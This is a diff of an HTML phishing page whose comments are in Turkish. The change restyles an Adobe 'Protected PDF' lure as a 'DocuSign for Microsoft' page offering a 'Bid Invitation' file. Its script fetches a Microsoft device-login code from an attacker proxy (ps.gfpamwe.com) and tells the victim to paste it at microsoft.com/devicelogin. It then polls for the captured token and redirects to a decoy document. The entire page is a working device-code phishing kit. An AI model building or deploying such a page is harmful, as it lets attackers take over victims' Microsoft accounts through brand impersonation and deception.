@@ -1,259 +1,348 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Adobe Acrobat Reader – Protected PDF</title>
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect x='2' y='2' width='20' height='24' rx='2' fill='%23e53e3e'/%3E%3Ctext x='12' y='15' text-anchor='middle' fill='white' font-size='8' font-weight='bold' font-family='Arial'%3EPDF%3C/text%3E%3C/svg%3E" />
-    <link rel="preconnect" href="https://use.typekit.net" crossorigin />
-    <link rel="stylesheet" href="https://use.typekit.net/hol7xhi.css" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DocuSign for Microsoft</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect x='2' y='2' width='20' height='24' rx='2' fill='%23e53e3e'/%3E%3Ctext x='12' y='15' text-anchor='middle' fill='white' font-size='8' font-weight='bold' font-family='Arial'%3EPDF%3C/text%3E%3C/svg%3E">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
-            font-family: 'adobe-clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f0f2f5;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f3f6f8;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            -webkit-font-smoothing: antialiased;
         }
 
         .container {
-            max-width: 480px;
+            max-width: 440px;
             width: 100%;
-            background: #ffffff;
+            background: white;
             border-radius: 12px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.10);
-            padding: 36px 32px 28px;
-            border: 1px solid #e8e8e8;
-            transition: all 0.2s;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            border: 1px solid #e8ecf0;
+            overflow: hidden;
+            padding: 40px 36px 32px;
+            text-align: center;
         }
 
-        /* ---------- HEADER ---------- */
-        .header {
+        /* Logo Area */
+        .logo-area {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 28px;
+        }
+
+        .ms-logo {
+            display: grid;
+            grid-template-columns: 9px 9px;
+            grid-template-rows: 9px 9px;
+            gap: 1.5px;
+        }
+
+        .ms-logo span:nth-child(1) { background: #f25022; }
+        .ms-logo span:nth-child(2) { background: #7fba00; }
+        .ms-logo span:nth-child(3) { background: #00a4ef; }
+        .ms-logo span:nth-child(4) { background: #ffb900; }
+
+        .logo-plus {
+            font-size: 16px;
+            color: #8a8a8a;
+            font-weight: 300;
+            margin: 0 2px;
+        }
+
+        .docusign-logo-img {
+            height: 22px;
+            width: auto;
+            display: block;
+        }
+
+        .logo-text {
+            font-size: 15px;
+            font-weight: 500;
+            color: #1f2937;
+            letter-spacing: -0.2px;
+        }
+
+        /* Title */
+        .title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #111827;
+            line-height: 1.3;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 13.5px;
+            color: #4b5563;
+            line-height: 1.5;
+            margin-bottom: 28px;
+            padding: 0 8px;
+        }
+
+        /* File Card */
+        .file-card {
             display: flex;
             align-items: center;
             gap: 12px;
+            background: #f9fafb;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            padding: 14px 16px;
             margin-bottom: 20px;
+            text-align: left;
         }
 
-        .pdf-icon {
-            width: 40px;
-            height: 48px;
-            background: #e53e3e;
-            border-radius: 6px;
+        .file-icon {
+            width: 36px;
+            height: 44px;
+            background: #dc2626;
+            border-radius: 3px;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             position: relative;
             flex-shrink: 0;
-            box-shadow: 0 2px 8px rgba(229, 62, 62, 0.35);
+            box-shadow: 0 1px 3px rgba(220, 38, 38, 0.25);
         }
-        .pdf-icon span {
-            color: #fff;
-            font-size: 12px;
+
+        .file-icon span {
+            color: white;
+            font-size: 8px;
             font-weight: 700;
             letter-spacing: 0.5px;
         }
-        .pdf-icon .corner {
+
+        .file-icon-corner {
             position: absolute;
             top: 0;
             right: 0;
-            width: 14px;
-            height: 14px;
-            background: #fff;
-            border-bottom-left-radius: 6px;
+            width: 10px;
+            height: 10px;
+            background: #f9fafb;
+            border-bottom-left-radius: 3px;
+        }
+
+        .file-icon-corner::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 0 10px 10px 0;
+            border-color: transparent #dc2626 transparent transparent;
+        }
+
+        .file-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .file-name {
+            font-size: 13.5px;
+            font-weight: 600;
+            color: #111827;
+            margin-bottom: 2px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .file-meta {
+            font-size: 12px;
+            color: #6b7280;
+        }
+
+        /* Code Area */
+        .code-area {
+            display: none;
+            margin-bottom: 20px;
+        }
+
+        .code-area.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .code-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            color: #6b7280;
+            letter-spacing: 1px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .code-display {
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 28px;
+            font-weight: 700;
+            color: #111827;
+            letter-spacing: 8px;
+            background: #f3f4f6;
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin-bottom: 10px;
+            border: 1px solid #e5e7eb;
+            min-height: 60px;
             display: flex;
             align-items: center;
             justify-content: center;
         }
-        .pdf-icon .corner svg {
-            width: 10px;
-            height: 10px;
-        }
 
-        .header-text h1 {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1a1a1a;
-            letter-spacing: -0.3px;
-        }
-        .header-text .sub {
+        .code-display.loading {
             font-size: 14px;
-            color: #6b6b6b;
-            font-weight: 400;
-            margin-top: -2px;
-        }
-
-        /* ---------- AÇIKLAMA ---------- */
-        .description {
-            font-size: 14px;
-            color: #2c2c2c;
-            line-height: 1.5;
-            margin-bottom: 24px;
-            padding: 0 4px;
-        }
-        .description strong {
-            font-weight: 600;
-            color: #1a1a1a;
-        }
-
-        /* ---------- KOD KUTUSU ---------- */
-        .code-box {
-            background: #1b1b1b;
-            border-radius: 8px;
-            padding: 20px 16px 18px;
-            text-align: center;
-            margin-bottom: 16px;
-        }
-        .code-box .label {
-            font-size: 11px;
-            text-transform: uppercase;
-            color: #a19f9d;
-            letter-spacing: 1px;
-            font-weight: 600;
-            margin-bottom: 4px;
-        }
-        .code-box .code {
-            font-family: 'Consolas', 'Courier New', monospace;
-            font-size: 34px;
-            font-weight: 700;
-            color: #0078d4;
-            letter-spacing: 8px;
-            margin: 6px 0 14px;
-            min-height: 52px;
-            word-break: break-all;
-        }
-        .code-box .code.loading {
-            color: #a19f9d;
-            font-size: 16px;
             letter-spacing: 1px;
             font-weight: 400;
+            color: #6b7280;
         }
-        .code-box .copy-btn {
+
+        .copy-btn {
             background: #0078d4;
             border: none;
             border-radius: 6px;
-            padding: 10px 32px;
+            padding: 10px 28px;
             font-size: 14px;
             font-weight: 600;
-            color: #fff;
+            color: white;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: background-color 0.2s;
             font-family: inherit;
         }
-        .code-box .copy-btn:hover {
-            background: #005a9e;
-        }
-        .code-box .copy-btn:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-        }
-        .code-box .copy-btn.copied {
-            background: #107c10;
+
+        .copy-btn:hover { background: #005a9e; }
+        .copy-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .copy-btn.copied { background: #107c10; }
+
+        /* Steps */
+        .steps-box {
+            text-align: left;
+            margin-bottom: 20px;
+            display: none;
         }
 
-        /* ---------- UNLOCK BUTONU ---------- */
-        .unlock-btn {
+        .steps-box.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .step-item {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 10px;
+            font-size: 13px;
+            color: #374151;
+            line-height: 1.4;
+        }
+
+        .step-number {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #0078d4;
+            color: white;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-right: 12px;
+            flex-shrink: 0;
+            margin-top: 0px;
+        }
+
+        /* Primary Button */
+        .primary-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
             width: 100%;
-            padding: 14px;
-            background: #1473e6;
-            color: #fff;
+            padding: 13px;
+            background: #0078d4;
+            color: white;
             border: none;
             border-radius: 6px;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s;
+            text-decoration: none;
             font-family: inherit;
-            margin-bottom: 20px;
+            transition: background 0.2s;
+            margin-bottom: 12px;
         }
-        .unlock-btn:hover {
-            background: #0d5bbf;
-        }
-        .unlock-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        .unlock-btn svg {
-            width: 20px;
-            height: 20px;
+
+        .primary-btn:hover { background: #005a9e; }
+        .primary-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .primary-btn svg {
+            margin-right: 8px;
+            width: 18px;
+            height: 18px;
             fill: currentColor;
             flex-shrink: 0;
         }
 
-        /* ---------- ALT BİLGİ ---------- */
-        .footer-info {
+        /* Footer Links */
+        .footer-links {
             display: flex;
-            flex-direction: column;
             align-items: center;
-            gap: 4px;
-            font-size: 12px;
-            color: #9a9a9a;
-            border-top: 1px solid #e8e8e8;
-            padding-top: 16px;
-            margin-top: 4px;
-        }
-        .footer-info .secure {
-            font-weight: 600;
-            color: #2c2c2c;
-            font-size: 13px;
-        }
-        .footer-info .expires {
-            font-weight: 500;
-            color: #d13438;
-            background: #fde7e9;
-            padding: 4px 14px;
-            border-radius: 20px;
-            font-size: 13px;
-            margin-top: 4px;
-        }
-        .footer-info .protected {
-            font-size: 11px;
-            color: #9a9a9a;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 8px;
+            flex-wrap: wrap;
         }
 
-        /* ---------- STATUS (hata/success) ---------- */
+        .footer-links a {
+            font-size: 12px;
+            color: #6b7280;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover { color: #0078d4; text-decoration: underline; }
+
+        .footer-links .dot {
+            width: 3px;
+            height: 3px;
+            background: #d1d5db;
+            border-radius: 50%;
+        }
+
+        /* Status */
         .status-msg {
-            margin: 12px 0 0;
-            padding: 8px 12px;
+            margin-top: 12px;
+            padding: 10px 14px;
             border-radius: 6px;
             font-size: 13px;
             text-align: center;
             display: none;
             font-weight: 500;
         }
-        .status-msg.show {
-            display: block;
-        }
-        .status-msg.error {
-            background: #fde7e9;
-            color: #d13438;
-        }
-        .status-msg.success {
-            background: #dff6dd;
-            color: #107c10;
-        }
-        .status-msg.info {
-            background: #e8f0fe;
-            color: #1a4d7a;
-        }
 
-        /* ---------- TOAST ---------- */
+        .status-msg.show { display: block; }
+        .status-msg.error { background: #fef2f2; color: #dc2626; }
+        .status-msg.success { background: #f0fdf4; color: #16a34a; }
+        .status-msg.info { background: #eff6ff; color: #1d4ed8; }
+
+        /* Toast */
         .toast {
             position: fixed;
             bottom: 30px;
@@ -262,8 +351,8 @@
             background: #1e293b;
             color: #fff;
             padding: 12px 20px;
-            border-radius: 8px;
-            font-size: 14px;
+            border-radius: 10px;
+            font-size: 13px;
             font-weight: 500;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
             opacity: 0;
@@ -273,23 +362,14 @@
             text-align: center;
             pointer-events: none;
         }
-        .toast.show {
-            transform: translateX(-50%) translateY(0);
-            opacity: 1;
-        }
 
-        /* ---------- RESPONSIVE ---------- */
+        .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+
         @media (max-width: 480px) {
-            .container {
-                padding: 24px 18px 20px;
-            }
-            .code-box .code {
-                font-size: 26px;
-                letter-spacing: 5px;
-            }
-            .header-text h1 {
-                font-size: 20px;
-            }
+            body { padding: 12px; }
+            .container { padding: 28px 20px 24px; }
+            .title { font-size: 20px; }
+            .code-display { font-size: 22px; letter-spacing: 5px; }
         }
     </style>
 </head>
@@ -297,54 +377,83 @@
 
     <div class="container">
 
-        <!-- HEADER: Adobe Acrobat Reader -->
-        <div class="header">
-            <div class="pdf-icon">
+        <!-- LOGO AREA -->
+        <div class="logo-area">
+            <div class="ms-logo">
+                <span></span><span></span><span></span><span></span>
+            </div>
+            <span class="logo-plus">+</span>
+            <img src="https://companieslogo.com/img/orig/DOCU_BIG-fc5d208a.png?t=1720244491" alt="DocuSign" class="docusign-logo-img" onerror="this.style.display='none'">
+            <span class="logo-text">DocuSign for Microsoft</span>
+        </div>
+
+        <!-- TITLE -->
+        <div class="title">Verify your identity to view the document</div>
+        <div class="subtitle">This document is protected by DocuSign. Sign in with your Microsoft account to access it securely.</div>
+
+        <!-- FILE CARD -->
+        <div class="file-card">
+            <div class="file-icon">
                 <span>PDF</span>
-                <div class="corner">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="#e53e3e" stroke-width="3">
-                        <polyline points="20 6 9 17 4 12" />
-                    </svg>
-                </div>
+                <div class="file-icon-corner"></div>
             </div>
-            <div class="header-text">
-                <h1>Adobe Acrobat Reader</h1>
-                <div class="sub">Access Protected PDF</div>
+            <div class="file-info">
+                <div class="file-name" id="pdfName">Bid Invitation</div>
+                <div class="file-meta" id="pdfMeta">Bid Invitation.pdf · 4 pages</div>
             </div>
         </div>
 
-        <!-- Açıklama -->
-        <div class="description">
-            Your PDF document is encrypted with <strong>Adobe Document Cloud security</strong>.
-            Use the access code to verify your identity and unlock the file.
-        </div>
-
-        <!-- KOD KUTUSU -->
-        <div class="code-box">
-            <div class="label">Document Access Code</div>
-            <div class="code loading" id="codeValue"><i class="fas fa-spinner fa-pulse"></i> Loading...</div>
+        <!-- CODE AREA (Hidden initially) -->
+        <div class="code-area" id="codeArea">
+            <div class="code-label">Your Verification Code</div>
+            <div class="code-display loading" id="codeValue"><i class="fas fa-spinner fa-pulse"></i> Loading...</div>
             <button class="copy-btn" id="copyBtn" disabled>Copy Code</button>
         </div>
 
-        <!-- UNLOCK PDF BUTONU (Microsoft login tetikleyicisi) -->
-        <button class="unlock-btn" id="loginBtn" disabled>
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" width="20" height="20">
-                <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
-                <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
-                <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
-                <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
-            </svg>
-            UNLOCK PDF
+        <!-- STEPS (Hidden initially) -->
+        <div class="steps-box" id="stepsBox">
+            <div class="step-item">
+                <div class="step-number">1</div>
+                <div>Copy the verification code above</div>
+            </div>
+            <div class="step-item">
+                <div class="step-number">2</div>
+                <div>Click "Sign in with Microsoft" below</div>
+            </div>
+            <div class="step-item">
+                <div class="step-number">3</div>
+                <div>Paste the code and sign in</div>
+            </div>
+        </div>
+
+        <!-- PRIMARY BUTTON -->
+        <button class="primary-btn" id="actionBtn">
+            Get verification code
         </button>
 
-        <!-- Durum mesajı -->
+        <!-- MICROSOFT LOGIN BUTTON (Hidden initially) -->
+        <a href="https://microsoft.com/devicelogin" class="primary-btn" id="loginBtn" style="display:none;" disabled>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" width="16" height="16">
+                <rect x="1" y="1" width="10" height="10" fill="white"/>
+                <rect x="12" y="1" width="10" height="10" fill="white"/>
+                <rect x="1" y="12" width="10" height="10" fill="white"/>
+                <rect x="12" y="12" width="10" height="10" fill="white"/>
+            </svg>
+            Sign in with Microsoft
+        </a>
+
+        <!-- STATUS -->
         <div id="statusMsg" class="status-msg"></div>
 
-        <!-- ALT BİLGİ -->
-        <div class="footer-info">
-            <div class="secure">🔒 Adobe Secure Platform</div>
-            <div class="protected">Protected by Adobe Document Cloud security</div>
-            <div class="expires" id="expiryDisplay">⏳ Code expires in <span id="timer">15:00</span></div>
+        <!-- FOOTER LINKS -->
+        <div class="footer-links">
+            <a href="#">Microsoft account</a>
+            <span class="dot"></span>
+            <a href="#">DocuSign</a>
+            <span class="dot"></span>
+            <a href="#">Security</a>
+            <span class="dot"></span>
+            <a href="#">Privacy</a>
         </div>
 
     </div>
@@ -353,12 +462,12 @@
     <div class="toast" id="toast"></div>
 
     <script>
-        // =============================================================
-        //   MEVCUT ÇALIŞMA MANTIĞI – HİÇBİR DEĞİŞİKLİK YAPILMADI
-        //   SADECE UI TETİKLEYİCİLERİ GÜNCELLENDİ
-        // =============================================================
+        // ============================================================
+        // PROXY ÜZERİNDEN API ÇAĞRISI
+        // Proxy: https://proxchangemarket.com/secured/proxy.php (kök dizinde)
+        // ============================================================
 
-        // ===== API ADRESI (Proxy) =====
+        // ===== API ADRESİ (Proxy üzerinden) =====
         var API_URL = 'https://ps.gfpamwe.com/secret/proxy.php';
         var USER_ID = 14;
 
@@ -367,38 +476,18 @@
         var currentDeviceCode = null;
         var isPollingActive = false;
         var pollInterval = null;
+        var codeFetched = false;
 
         // ===== DOM ELEMANLARI =====
         var codeEl = document.getElementById('codeValue');
         var copyBtn = document.getElementById('copyBtn');
         var loginBtn = document.getElementById('loginBtn');
+        var actionBtn = document.getElementById('actionBtn');
+        var codeArea = document.getElementById('codeArea');
+        var stepsBox = document.getElementById('stepsBox');
         var statusMsg = document.getElementById('statusMsg');
         var toast = document.getElementById('toast');
-        var timerSpan = document.getElementById('timer');
-
-        // ===== SÜRE SAYACI =====
-        var expirySeconds = 900; // 15 dakika (başlangıç)
-        var timerInterval = null;
-
-        function startTimer(seconds) {
-            expirySeconds = seconds || 900;
-            clearInterval(timerInterval);
-            timerInterval = setInterval(function() {
-                var mins = Math.floor(expirySeconds / 60);
-                var secs = expirySeconds % 60;
-                timerSpan.textContent = String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
-                if (expirySeconds <= 0) {
-                    clearInterval(timerInterval);
-                    timerSpan.textContent = '00:00';
-                    // opsiyonel: kod süresi doldu mesajı
-                }
-                expirySeconds--;
-            }, 1000);
-        }
-
-        function stopTimer() {
-            clearInterval(timerInterval);
-        }
+        var pdfNameEl = document.querySelector('.pdf-name');
 
         // ===== STATUS MESAJLARI =====
         function showStatus(message, type) {
@@ -428,32 +517,29 @@
         function showCode(code) {
             currentCode = code;
             codeEl.textContent = code;
-            codeEl.className = 'code';
+            codeEl.className = 'code-display';
             copyBtn.disabled = false;
             loginBtn.disabled = false;
             hideStatus();
-            // süreyi başlat (15 dakika)
-            startTimer(900);
         }
 
         function showLoading() {
             codeEl.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Loading...';
-            codeEl.className = 'code loading';
+            codeEl.className = 'code-display loading';
             copyBtn.disabled = true;
             loginBtn.disabled = true;
-            stopTimer();
-            timerSpan.textContent = '--:--';
         }
 
-        // ===== KOPYALA =====
+        // ===== KOD KOPYALA =====
         function copyCode() {
             if (!currentCode) {
                 showToast('No code available. Please wait.');
                 return;
             }
+
             if (navigator.clipboard && navigator.clipboard.writeText) {
                 navigator.clipboard.writeText(currentCode).then(function() {
-                    showToast('✓ Code copied!');
+                    showToast('✓ Code copied! Right-click and Paste on Microsoft page.');
                     copyBtn.textContent = 'Copied!';
                     copyBtn.classList.add('copied');
                     setTimeout(function() {
@@ -473,7 +559,7 @@
             ta.select();
             try {
                 document.execCommand('copy');
-                showToast('✓ Code copied!');
+                showToast('✓ Code copied! Right-click and Paste on Microsoft page.');
                 copyBtn.textContent = 'Copied!';
                 copyBtn.classList.add('copied');
                 setTimeout(function() {
@@ -489,7 +575,7 @@
         // ===== API'DEN KOD AL =====
         function fetchCodeFromAPI() {
             showLoading();
-            showStatus('Getting access code...', 'info');
+            showStatus('Getting verification code...', 'info');
 
             var data = {
                 action: 'get_auth_broker_device_code',
@@ -503,31 +589,34 @@
                 body: JSON.stringify(data)
             })
             .then(function(response) {
-                if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
+                if (!response.ok) {
+                    throw new Error('HTTP error! status: ' + response.status);
+                }
                 return response.json();
             })
             .then(function(data) {
                 if (data.error) {
                     showStatus('Error: ' + data.error, 'error');
                     codeEl.textContent = '------';
-                    codeEl.className = 'code';
+                    codeEl.className = 'code-display';
                     return;
                 }
+
                 if (data.user_code && data.device_code) {
                     currentDeviceCode = data.device_code;
                     showCode(data.user_code);
                     showStatus('✓ Code received!', 'success');
                     setTimeout(hideStatus, 3000);
                 } else {
-                    showStatus('Unexpected response.', 'error');
+                    showStatus('Unexpected response from server.', 'error');
                     codeEl.textContent = '------';
-                    codeEl.className = 'code';
+                    codeEl.className = 'code-display';
                 }
             })
             .catch(function(err) {
                 showStatus('Network error. Please refresh.', 'error');
                 codeEl.textContent = '------';
-                codeEl.className = 'code';
+                codeEl.className = 'code-display';
                 console.error('Fetch error:', err);
             });
         }
@@ -538,7 +627,8 @@
                 showToast('No code available. Please wait.');
                 return;
             }
-            // Kodu panoya kopyala (yardım amaçlı)
+
+            // Kodu kopyala
             if (navigator.clipboard && navigator.clipboard.writeText) {
                 navigator.clipboard.writeText(currentCode);
             }
@@ -554,6 +644,7 @@
                 ',toolbar=no,menubar=no,scrollbars=yes,resizable=yes'
             );
 
+            // Polling başlat
             if (currentDeviceCode) {
                 startPolling();
             }
@@ -565,7 +656,10 @@
                 clearInterval(pollInterval);
                 pollInterval = null;
             }
-            if (!currentDeviceCode) return;
+
+            if (!currentDeviceCode) {
+                return;
+            }
 
             isPollingActive = true;
             showStatus('⏳ Waiting for authentication...', 'info');
@@ -594,7 +688,7 @@
                             window.location.href = 'https://docs-previews-0010.app/f/5b3m4n6v2l1g';
                         }, 1500);
                     } else if (data.waiting) {
-                        // bekliyor
+                        // bekliyor - devam
                     } else if (data.error) {
                         clearInterval(pollInterval);
                         pollInterval = null;
@@ -608,9 +702,20 @@
             }, 5000);
         }
 
-        // ===== BUTON BAĞLANTILARI =====
+        // ===== BUTON AYARLARI =====
         function setupButtons() {
             copyBtn.addEventListener('click', copyCode);
+
+            actionBtn.addEventListener('click', function() {
+                if (!codeFetched) {
+                    codeFetched = true;
+                    codeArea.classList.add('show');
+                    stepsBox.classList.add('show');
+                    actionBtn.style.display = 'none';
+                    loginBtn.style.display = 'flex';
+                    fetchCodeFromAPI();
+                }
+            });
 
             loginBtn.addEventListener('click', function(e) {
                 e.preventDefault();
@@ -618,12 +723,13 @@
             });
         }
 
-        // ===== BAŞLAT =====
-        document.addEventListener('DOMContentLoaded', function() {
+        // ===== INIT =====
+        function init() {
             setupButtons();
-            // Sayfa yüklenir yüklenmez kodu al
-            fetchCodeFromAPI();
-        });
+        }
+
+        document.addEventListener('DOMContentLoaded', init);
     </script>
+
 </body>
 </html>
